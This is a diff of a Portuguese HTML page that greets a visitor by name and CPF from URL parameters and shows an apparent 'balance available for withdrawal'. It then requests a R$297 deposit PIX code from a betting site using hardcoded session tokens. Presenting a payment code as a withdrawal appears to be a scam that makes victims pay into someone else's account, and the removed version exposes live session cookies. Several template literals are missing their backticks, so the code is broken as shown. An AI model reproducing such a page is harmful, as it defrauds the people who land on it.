@@ -3,61 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Requisição POST com Cabeçalhos Personalizados</title>
+    <title>Pagar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f8f8f8;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .info {
+            margin-bottom: 20px;
+        }
+
+        .info p {
+            font-size: 18px;
+            margin: 10px 0;
+        }
+
+        .pix-placeholder {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #f1f1f1;
+            border-radius: 10px;
+            font-size: 16px;
+            color: #555;
+        }
+    </style>
 </head>
 <body>
-    <h1>Teste de Requisição POST</h1>
-    <button onclick="enviarRequisicao()">Enviar Requisição</button>
+    <div class="container">
+        <h1 id="user-name"></h1>
+        <div class="info">
+            <p>Valor disponível para retirada: <span id="valor-disponivel"></span></p>
+            <p>CPF do titular: <span id="cpf-titular"></span></p>
+        </div>
+        <div class="pix-placeholder" id="pix-placeholder">
+            Aguarde, carregando código PIX...
+        </div>
+    </div>
 
     <script>
-        function enviarRequisicao() {
-            const url = 'https://6n6bet.com/finance/third/deposit?t=1739535135144';
-            const dados = new URLSearchParams({
-                'amount': '297',
-                'third_id': '2060',
-                'join_promo': '2',
-                'choose_promo': ''
-            });
-
-            const cabecalhos = {
-                'Accept': '*/*',
-                'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://fabiodkk.github.io',
-                'Referer': 'https://6n6bet.com/mine',
-                'Cookie': '__cf_bm=V9ZBw8KLs3bMe7nYApo_mozXBEH.gHnBIQ4EhC163tg-1739533935-1.0.1.1-TVjzPcIltk9ItEC93HqcTAaYSr8xmcATeSI0ZVoIUOSpzBfhtSE7nThU849b28Y0xnxKx_DcdoQAsQB31ECNAA; _cfuvid=Xg6KCh0jr1UOBhlJ.C2AsUEJaZiG.tb9_J8vOG04m6E-1739533935668-0.0.1.1-604800000',
-                'D': '24',
-                'Lang': 'pt',
-                'Noapi': '',
-                'Priority': 'u=1, i',
-                'Quick': '0',
-                'Sec-CH-UA': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"Windows"',
-                'Sec-Fetch-Dest': 'empty',
-                'Sec-Fetch-Mode': 'cors',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sourceurl': 'https://6n6bet.com/mine',
-                'T': 'o91:4035822796725149',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
-                'XX': '8504a2762d4d7dc986e45c1fcc8f1b78'
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: cabecalhos,
-                body: dados
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Resposta do servidor:', data);
-                alert('Requisição enviada com sucesso!');
-            })
-            .catch(error => {
-                console.error('Erro ao enviar requisição:', error);
-                alert('Erro ao enviar requisição!');
-            });
+        function getParameterByName(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
         }
+
+        function formatarCPF(cpf) {
+            if (!cpf || cpf.length !== 11) return cpf;
+            return ${cpf.slice(0, 3)}.***.***-${cpf.slice(-2)};
+        }
+
+        const nome = getParameterByName('nome');
+        const cpf = getParameterByName('cpf');
+        const saldo = getParameterByName('saldo');
+
+        if (nome && cpf && saldo) {
+            document.getElementById('user-name').textContent = Olá, ${nome};
+            document.getElementById('valor-disponivel').textContent = R$${parseFloat(saldo).toFixed(2).replace('.', ',')};
+            document.getElementById('cpf-titular').textContent = formatarCPF(cpf);
+        } else {
+            alert("Dados inválidos. Por favor, retorne à página anterior.");
+            window.location.href = "https://sites.google.com/view/rendaganha/home";
+        }
+
+    async function carregarCodigoPIX() {
+        const url = "https://6n6bet.com/finance/third/deposit?t=1739535693742";
+        const data = "amount=297&third_id=2060&join_promo=2&choose_promo=";
+
+        try {
+            const response = await fetch(url, {
+                method: "POST",
+                headers: {
+                    "accept": "*/*",
+                    "accept-language": "pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
+                    "content-type": "application/x-www-form-urlencoded",
+                    "d": "24",
+                    "lang": "pt",
+                    "origin": "https://6n6bet.com",
+                    "priority": "u=1, i",
+                    "quick": "0",
+                    "referer": "https://6n6bet.com/mine",
+                    "sec-ch-ua": "\"Not(A:Brand\";v=\"99\", \"Microsoft Edge\";v=\"133\", \"Chromium\";v=\"133\"",
+                    "sec-ch-ua-mobile": "?0",
+                    "sec-ch-ua-platform": "\"Windows\"",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "sourceurl": "https://6n6bet.com/mine",
+                    "t": "o91:4035822796725149",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
+                    "xx": "90afc375593fdfeb634df0bdb6cbe5da"
+                },
+                body: data
+            });
+                if (response.ok) {
+                    const result = await response.json();
+                    const codigoPix = result?.pix_code || "Código PIX não encontrado.";
+                    document.getElementById("pix-placeholder").innerHTML = 
+                        <p>Código PIX: ${codigoPix}</p>
+                    ;
+                } else {
+                    document.getElementById("pix-placeholder").textContent = "Erro na requisição: " + response.status;
+                }
+            } catch (error) {
+                document.getElementById("pix-placeholder").textContent = "Erro: " + error.message;
+            }
+        }
+
+        carregarCodigoPIX();
     </script>
 </body>
 </html>
